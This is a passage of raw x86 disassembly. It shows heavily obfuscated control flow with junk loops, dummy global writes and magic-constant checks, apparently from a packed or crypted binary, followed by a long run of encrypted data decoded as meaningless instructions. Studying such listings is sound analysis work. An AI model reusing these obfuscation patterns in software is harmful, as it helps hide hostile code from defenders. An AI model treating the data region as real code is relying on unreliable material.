  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     cl,BYTE PTR [esi]
  417972:	mov    esp,0xb884eee8
  417977:	jp     0x4179f4
  417979:	call   0x18bcf51a
  41797e:	mov    esi,0x771d9658
  417983:	retf   
  417984:	retf   
  417985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417986:	or     bh,bl
  417988:	and    al,0xb0
  41798a:	outs   dx,BYTE PTR ds:[esi]
  41798b:	jge    0x4179cd
  41798d:	dec    ebx
  41798e:	pop    DWORD PTR [esi]
  417990:	adc    BYTE PTR [eax],cl
  417992:	fimul  DWORD PTR [esi]
  417994:	sbb    ah,dl
  417996:	mov    edi,0xa7ad13a7
  41799b:	adc    DWORD PTR [ecx-0x79],0x40ec71a5
  4179a2:	mov    cl,0xe5
  4179a4:	jp     0x417967
  4179a6:	es and eax,0xcf2ceed0
  4179ac:	clc    
  4179ad:	mov    ds,WORD PTR [ebx+0x5e]
  4179b0:	sub    ah,BYTE PTR [edi+0x4e6ddef3]
  4179b6:	sbb    eax,0xb4fa2481
  4179bb:	das    
  4179bc:	pushf  
  4179bd:	outs   dx,DWORD PTR ds:[esi]
  4179be:	cdq    
  4179bf:	jae    0x4179d4
  4179c1:	dec    esp
  4179c2:	fdivrp st(7),st
  4179c4:	out    dx,al
  4179c5:	xchg   DWORD PTR [ebx-0x17],edx
  4179c8:	cs daa 
  4179ca:	or     edx,edi
  4179cc:	call   0x44a192a3
  4179d1:	add    ch,bh
  4179d3:	jo     0x417a34
  4179d5:	aaa    
  4179d6:	outs   dx,DWORD PTR ds:[esi]
  4179d7:	sar    DWORD PTR [edx],0x97
  4179da:	aad    0x56
  4179dc:	sub    eax,0x11cd129f
  4179e1:	ins    BYTE PTR es:[edi],dx
  4179e2:	loop   0x4179cd
  4179e4:	xor    eax,0x101a80d1
  4179e9:	fdivr  DWORD PTR [edx*4-0x704072f9]
  4179f0:	pop    ecx
  4179f1:	fwait
  4179f2:	pop    ebp
  4179f3:	in     al,dx
  4179f4:	sbb    bl,0x9
  4179f7:	push   es
  4179f8:	cs adc al,0x3c
  4179fb:	and    cl,BYTE PTR [eax+0x27]
  4179fe:	add    al,dl
  417a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a01:	ja     0x417a3c
  417a03:	leave  
  417a04:	push   es
  417a05:	add    al,0x6d
  417a07:	js     0x4179c4
  417a09:	adc    BYTE PTR [esi],ah
  417a0b:	popf   
  417a0c:	lahf   
  417a0d:	mov    BYTE PTR [esi+eiz*4+0x4f],cl
  417a11:	out    dx,eax
  417a12:	and    eax,0x82e41ea1
  417a17:	ja     0x417a94
  417a19:	and    ecx,edx
  417a1b:	jae    0x4179cf
  417a1d:	icebp  
  417a1e:	stos   BYTE PTR es:[edi],al
  417a1f:	xor    DWORD PTR [edx],edx
  417a21:	fdiv   QWORD PTR [ebx+0x65d6c65b]
  417a27:	in     al,0xaf
  417a29:	lahf   
  417a2a:	or     DWORD PTR [edx+0x71],0xffffff93
  417a2e:	adc    al,0x73
  417a30:	sbb    dh,BYTE PTR cs:[edx+0x7009ebc6]
  417a37:	sub    al,0x3
  417a39:	arpl   WORD PTR [ecx+0x3b],dx
  417a3c:	dec    ecx
  417a3d:	setnp  BYTE PTR fs:[ecx-0x23873068]
  417a45:	idiv   bl
  417a47:	outs   dx,BYTE PTR ds:[esi]
  417a48:	xlat   BYTE PTR ds:[ebx]
  417a49:	jl     0x417aae
  417a4b:	push   0xb5b4e0b4
  417a50:	xchg   ebp,eax
  417a51:	sbb    dl,BYTE PTR [ecx+0x4f]
  417a54:	shl    ch,cl
  417a56:	sub    DWORD PTR [ebx],ebx
  417a58:	call   0xdfbc:0x1fcb7ed5
  417a5f:	fdivr  QWORD PTR [ecx]
  417a61:	mov    eax,ds:0x7305c2c6
  417a66:	loope  0x417ad1
  417a68:	mov    edi,0x1b9948d1
  417a6d:	xchg   ebx,eax
  417a6e:	neg    DWORD PTR [ecx+eax*2]
  417a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a72:	mov    bl,0x86
  417a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a75:	adc    al,0x90
  417a77:	inc    ecx
  417a78:	inc    ecx
  417a79:	or     bl,BYTE PTR [eax]
  417a7b:	ret    
  417a7c:	xchg   ah,cl
  417a7e:	das    
  417a7f:	imul   esi,edx,0x57
  417a82:	in     eax,0xdd
  417a84:	xchg   ecx,eax
  417a85:	psubsb mm1,QWORD PTR [edi+0x9882450]
  417a8c:	push   eax
  417a8d:	sar    BYTE PTR [eax],cl
  417a8f:	jns    0x417a85
  417a91:	repnz sbb eax,0xa13c00f2
  417a97:	push   esp
  417a98:	out    dx,al
  417a99:	sti    
  417a9a:	inc    ebp
  417a9b:	xchg   ebx,eax
  417a9c:	adc    al,0xaf
  417a9e:	push   esp
  417a9f:	icebp  
  417aa0:	pop    ebx
  417aa1:	movq   QWORD PTR cs:[esi],mm6
  417aa5:	jmp    0x3df15d7e
  417aaa:	shr    BYTE PTR [ecx-0x65],0x45
  417aae:	adc    DWORD PTR [edi-0x2f],0x74d25e72
  417ab5:	push   esi
  417ab6:	xchg   DWORD PTR ds:0x586af2f0,edx
  417abc:	icebp  
  417abd:	cmp    DWORD PTR [ecx-0x2a],eax
  417ac0:	mov    eax,ds:0xc2d75aab
  417ac5:	pop    ebx
  417ac6:	jns    0x417a66
  417ac8:	jmp    0x4cf6:0xdfbad102
  417acf:	and    ah,ch
  417ad1:	outs   dx,DWORD PTR ds:[esi]
  417ad2:	cmc    
  417ad3:	sub    eax,0x54589d1c
  417ad8:	xor    eax,0x5a81f0f4
  417add:	push   edi
  417ade:	add    dh,BYTE PTR [eax+0x77]
  417ae1:	jg     0x417b27
  417ae3:	add    eax,0x59ca185e
  417ae8:	dec    ebp
  417ae9:	lock inc ecx
  417aeb:	push   edx
  417aec:	mov    WORD PTR [eax+ecx*4+0x28159cf1],gs
  417af3:	mov    eax,0x74bbf4e8
  417af8:	out    dx,eax
  417af9:	test   DWORD PTR ds:0xe344cbc9,ecx
  417aff:	mov    edx,edx
  417b01:	add    al,0x8c
  417b03:	fcom   st(0)
  417b05:	fimul  WORD PTR [edx+0x31]
  417b08:	mov    ebp,0x48556f3b
  417b0d:	inc    edi
  417b0e:	mov    al,0x22
  417b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b11:	lock addr16 mov eax,ds:0x781b
  417b17:	mov    ch,0xf4
  417b19:	xchg   ebx,eax
  417b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b1b:	aas    
  417b1c:	mov    gs,WORD PTR [edx-0x24]
  417b1f:	sbb    eax,DWORD PTR [esi+ebx*8]
  417b22:	out    0xa,al
  417b24:	jbe    0x417ae5
  417b26:	dec    ecx
  417b27:	pop    edi
  417b28:	lock loopne 0x417ab2
  417b2b:	fs push ds
  417b2d:	xor    al,0xa4
  417b2f:	scas   eax,DWORD PTR es:[edi]
  417b30:	cdq    
  417b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b32:	arpl   WORD PTR [ecx],di
  417b34:	inc    esi
  417b35:	pop    ss
  417b36:	mov    bl,0xb7
  417b38:	and    DWORD PTR [edx],ebp
  417b3a:	shl    BYTE PTR [edi],0x7d
  417b3d:	inc    ebx
  417b3e:	xor    DWORD PTR [edi+0x74],0x70
  417b42:	add    eax,0x9b1e4c40
  417b47:	and    edx,0xe3a92747
  417b4d:	push   ebx
  417b4e:	jg     0x417bc2
  417b50:	bnd jno 0x417b0a
  417b53:	outs   dx,BYTE PTR ds:[esi]
  417b54:	push   0xffffff85
  417b56:	jl     0x417bb9
  417b58:	jo     0x417b1d
  417b5a:	sbb    BYTE PTR [edi],dh
  417b5c:	pusha  
  417b5d:	xchg   edi,eax
  417b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b5f:	out    0x2f,al
  417b61:	stos   DWORD PTR es:[edi],eax
  417b62:	jle    0x417b03
  417b64:	jbe    0x417b42
  417b66:	ja     0x417b62
  417b68:	jo     0x417aed
  417b6a:	(bad)  
  417b6c:	out    dx,eax
  417b6d:	scas   al,BYTE PTR es:[edi]
  417b6e:	sub    DWORD PTR [ebx],esi
  417b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b71:	fs imul ebp,ebx,0xffffffce
  417b75:	nop
  417b76:	hlt    
  417b77:	addr16 rcl bl,cl
  417b7a:	mov    esi,0xdaa1dfa8
  417b7f:	nop
  417b80:	shl    DWORD PTR [edx-0x2244814c],1
  417b86:	xchg   edx,eax
  417b87:	sub    ah,BYTE PTR [ecx+0x5548af92]
  417b8d:	and    BYTE PTR [ebx-0x56],al
  417b90:	jg     0x417b78
  417b92:	cmp    al,0xb8
  417b94:	mov    dl,0xf4
  417b96:	repz dec ebx
  417b98:	sbb    DWORD PTR [ebx-0x6f455cc2],0x4b009f7b
  417ba2:	jnp    0x417b28
  417ba4:	loope  0x417bb5
  417ba6:	push   es
  417ba7:	fisubr WORD PTR ss:[edi-0x5a61071a]
  417bae:	cmp    al,0xe9
  417bb0:	pop    esp
  417bb1:	fistp  WORD PTR [ebx-0x31c424c4]
  417bb7:	in     al,0x28
  417bb9:	inc    edx
  417bba:	out    0x10,eax
  417bbc:	xlat   BYTE PTR ds:[ebx]
  417bbd:	xchg   ebp,ecx
  417bbf:	and    eax,0xca240140
  417bc4:	xor    BYTE PTR [ebx-0x61c43c33],dh
  417bca:	sub    al,0x29
  417bcc:	mov    DWORD PTR [eax-0x65],ecx
  417bcf:	push   ds
  417bd0:	imul   esi
  417bd2:	xchg   edi,eax
  417bd3:	mov    dh,0xaf
  417bd5:	push   0x76f4a47a
  417bda:	add    al,0x48
  417bdc:	ins    BYTE PTR es:[edi],dx
  417bdd:	push   es
  417bde:	aad    0x0
  417be0:	lea    eax,[esi+ebp*1-0xb]
  417be4:	and    edx,esi
  417be6:	fwait
  417be7:	mov    bl,0xc0
  417be9:	fwait
  417bea:	sti    
  417beb:	mov    al,0x7d
  417bed:	mov    dl,0x99
  417bef:	add    al,BYTE PTR [ecx]
  417bf1:	sbb    BYTE PTR [ebp-0x450cb5f1],0x56
  417bf8:	sbb    al,bh
  417bfa:	es inc esi
  417bfc:	std    
  417bfd:	repz xor al,0x8d
  417c00:	cmc    
  417c01:	shr    DWORD PTR [ebp+0x162f25f7],cl
  417c07:	pop    esi
  417c08:	sar    BYTE PTR ds:[ecx-0x600c30a],cl
  417c0f:	clc    
  417c10:	mov    ebp,0xf42b8d2c
  417c15:	mov    edi,0x1b7a0181
  417c1a:	mov    edi,0xcf56f7c3
  417c1f:	jns    0x417c46
  417c21:	jg     0x417c55
  417c23:	jg     0x417c95
  417c25:	pop    ebx
  417c26:	and    BYTE PTR [edi],0x9e
  417c29:	add    edx,DWORD PTR [ebx+0x1a624467]
  417c2f:	mov    al,bh
  417c31:	imul   ebp,DWORD PTR [edi+0x5a],0xf7ef7270
  417c38:	in     al,dx
  417c39:	sbb    al,0xf8
  417c3b:	jmp    0x417c8f
  417c3d:	loope  0x417c52
  417c3f:	aaa    
  417c40:	push   ecx
  417c41:	loop   0x417bd9
  417c43:	adc    bh,BYTE PTR [ebx+esi*1-0x70]
  417c47:	or     dl,BYTE PTR [ebp-0x66]
  417c4a:	xchg   DWORD PTR [ebx+0x3a],ecx
  417c4d:	inc    ecx
  417c4e:	sbb    ebp,DWORD PTR [esi]
  417c50:	push   es
  417c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c52:	fldcw  WORD PTR [ebx+eax*8]
  417c55:	ja     0x417bf9
  417c57:	bound  edx,QWORD PTR [ebp+0x13]
  417c5a:	add    DWORD PTR [edi+0x2f],eax
  417c5d:	jmp    0x7c6b:0x4a6c4b30
  417c64:	jmp    0x7646:0xca082b3f
  417c6b:	shl    BYTE PTR [edx-0x64],1
  417c6e:	ffree  st(5)
  417c70:	je     0x719a5f99
  417c76:	ret    
  417c77:	ret    0x5fad
  417c7a:	dec    ebx
  417c7b:	hlt    
  417c7c:	sbb    edx,DWORD PTR [bp-0x9]
  417c80:	cmp    ebp,DWORD PTR [ecx]
  417c82:	mov    ecx,0x25650f12
  417c87:	aaa    
  417c88:	or     DWORD PTR [ebp-0x49],edx
  417c8b:	sti    
  417c8c:	mov    ecx,0xf2d58b6b
  417c91:	push   ecx
  417c92:	cli    
  417c93:	pushf  
  417c94:	jge    0x417c24
  417c96:	sbb    BYTE PTR [ebp-0x4fe38eba],0x38
  417c9d:	dec    edx
  417c9e:	xchg   ebp,eax
  417c9f:	shl    DWORD PTR [eax-0x6a],1
  417ca2:	stc    
  417ca3:	shl    DWORD PTR ds:0x58b491d8,1
  417ca9:	pop    esp
  417caa:	xor    eax,0x51f761b6
  417caf:	adc    ah,ch
  417cb1:	push   edx
  417cb2:	fs dec esi
  417cb4:	xor    eax,0xe1e69853
  417cb9:	scas   al,BYTE PTR es:[edi]
  417cba:	dec    eax
  417cbb:	xor    edx,ebp
  417cbd:	(bad)  [esi]
  417cbf:	dec    esp
  417cc0:	sti    
  417cc1:	scas   eax,DWORD PTR es:[edi]
  417cc2:	mov    cl,0x8e
  417cc4:	ins    DWORD PTR es:[edi],dx
  417cc5:	jecxz  0x417c82
  417cc7:	fdiv   st,st(6)
  417cc9:	leave  
  417cca:	sub    al,0xcf
  417ccc:	das    
  417ccd:	cmp    cl,BYTE PTR [ebx]
  417ccf:	mov    bl,bl
  417cd1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  417cd3:	push   ecx
  417cd4:	dec    esp
  417cd5:	jbe    0x417c59
  417cd7:	int    0x99
  417cd9:	(bad)  ds:0xc5dc80e
  417cdf:	mov    eax,ds:0x8e516a9a
  417ce4:	or     dl,cl
  417ce6:	pop    eax
  417ce7:	jmp    0x417d57
  417ce9:	aam    0xfb
  417ceb:	pop    edx
  417cec:	inc    ecx
  417ced:	loop   0x417ca5
  417cef:	pop    esi
  417cf0:	jg     0x417cdc
  417cf2:	pop    ebp
  417cf3:	push   ebx
  417cf4:	jb     0x417d24
  417cf6:	call   0x71b0976a
  417cfb:	gs jmp 0x57d9a7d2
  417d01:	cli    
  417d02:	sub    al,0x19
  417d04:	xor    eax,0xe7c3b92a
  417d09:	les    ebp,FWORD PTR [ecx-0x63]
  417d0c:	repz (bad) 
  417d0e:	out    0x82,eax
  417d10:	push   ebp
  417d11:	data16 sub al,0xe4
  417d14:	js     0x417ce0
  417d16:	mov    edi,0x864b884a
  417d1b:	lahf   
  417d1c:	pushf  
  417d1d:	dec    ecx
  417d1e:	fstp   DWORD PTR [esi+0x9d2a09b]
  417d24:	lods   eax,DWORD PTR ds:[esi]
  417d25:	test   BYTE PTR es:[esi-0x64],bl
  417d29:	inc    ebx
  417d2a:	retf   
  417d2b:	inc    esi
  417d2c:	(bad)
  417d2f:	pop    edx
  417d30:	or     edx,DWORD PTR [esi+ecx*1]
  417d33:	out    dx,eax
  417d34:	scas   eax,DWORD PTR es:[edi]
  417d35:	pop    ds
  417d36:	in     eax,0x63
  417d38:	div    BYTE PTR [edi]
  417d3a:	ror    ecx,1
  417d3c:	ds or  bh,ch
  417d3f:	jl     0x417cf8
  417d41:	stos   DWORD PTR es:[edi],eax
  417d42:	fs pop ss
  417d44:	(bad)  
  417d45:	ins    BYTE PTR es:[edi],dx
  417d46:	in     eax,0xa9
  417d48:	jmp    0x417cd0
  417d4a:	fisttp WORD PTR [ebx+eiz*4+0x72]
  417d4e:	repnz stos DWORD PTR es:[edi],eax
  417d50:	sub    DWORD PTR [ebx],esi
  417d52:	and    DWORD PTR [esi],eax
  417d54:	mov    edi,0x703b3e99
  417d59:	pusha  
  417d5a:	cmp    dh,0x6c
  417d5d:	xor    ch,BYTE PTR [edx+0x72]
  417d60:	leave  
  417d61:	cld    
  417d62:	inc    edx
  417d63:	fld    DWORD PTR [edi+0x15]
  417d66:	int3   
  417d67:	outs   dx,BYTE PTR ds:[esi]
  417d68:	xchg   edi,eax
  417d69:	addr16 aam 0xac
  417d6c:	push   esi
  417d6d:	test   BYTE PTR [eax],bh
  417d6f:	mov    ch,0xbb
  417d71:	xor    al,0x6d
  417d73:	jmp    0xfb9c:0xcb1abbe5
  417d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d7b:	add    al,0x4b
  417d7d:	mov    edx,0xa92f420d
  417d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d83:	inc    ecx
  417d84:	mov    es,WORD PTR [eax-0x3d]
  417d87:	jb     0x417d61
  417d89:	dec    ebp
  417d8a:	sbb    DWORD PTR [eax],0x4eb51810
  417d90:	jecxz  0x417de0
  417d92:	push   eax
  417d93:	inc    esi
  417d94:	rcl    BYTE PTR [esi+ebp*2],cl
  417d97:	into   
  417d98:	mov    ah,0x52
  417d9a:	xor    dl,BYTE PTR [ebx]
  417d9c:	shl    DWORD PTR [edi+0x5be769e3],1
  417da2:	inc    ebx
  417da3:	or     eax,0xccb514b4
  417da8:	and    BYTE PTR [ebp-0x77],dh
  417dab:	ds div esp
  417dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417daf:	xor    BYTE PTR [eax-0x656f1034],ah
  417db5:	icebp  
  417db6:	dec    ebp
  417db7:	pop    ds
  417db8:	icebp  
  417db9:	push   cs
  417dba:	inc    edx
  417dbb:	sahf   
  417dbc:	xchg   edi,eax
  417dbd:	bound  ebx,QWORD PTR [edi+0x4008f62c]
  417dc3:	dec    ebp
  417dc4:	leave  
  417dc5:	push   ebp
  417dc6:	ss push es
  417dc8:	push   ebp
  417dc9:	cli    
  417dca:	jo     0x417e19
  417dcc:	ss xchg edi,eax
  417dce:	imul   esp,DWORD PTR [ecx-0x15c0058a],0x1d
  417dd5:	retf   0xa312
  417dd8:	fisubr WORD PTR [edx+0x5b]
  417ddb:	and    eax,0x9d261b52
  417de0:	outs   dx,BYTE PTR ds:[esi]
  417de1:	push   ecx
  417de2:	mov    edx,0xc2c6a205
  417de7:	popa   
  417de8:	(bad)  
  417dea:	fmul   st,st(7)
  417dec:	sub    al,0xd
  417dee:	xchg   esi,eax
  417def:	fsubp  st(0),st
  417df1:	mul    esp
  417df3:	pusha  
  417df4:	adc    eax,0x70e2617
  417df9:	add    bl,BYTE PTR [ecx+eax*8-0x65]
  417dfd:	xchg   esi,eax
  417dfe:	sub    eax,0x3e1a0b4b
  417e03:	xlat   BYTE PTR ds:[ebx]
  417e04:	xchg   DWORD PTR [esi+esi*4+0x17],esp
  417e08:	jecxz  0x417e70
  417e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e0b:	shl    DWORD PTR [esi],0x20
  417e0e:	push   ebp
  417e0f:	mov    ebp,0x9149344a
  417e14:	xor    al,0x87
  417e16:	or     ebx,ecx
  417e18:	or     al,0xf0
  417e1a:	add    BYTE PTR [esi],dh
  417e1c:	push   es
  417e1d:	lds    edx,FWORD PTR [edx+ecx*1-0x17124ed3]
  417e24:	pop    ebp
  417e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e26:	les    edx,FWORD PTR [edi]
  417e28:	push   0x5c1f3f85
  417e2d:	ins    DWORD PTR es:[edi],dx
  417e2e:	nop
  417e2f:	int    0xc5
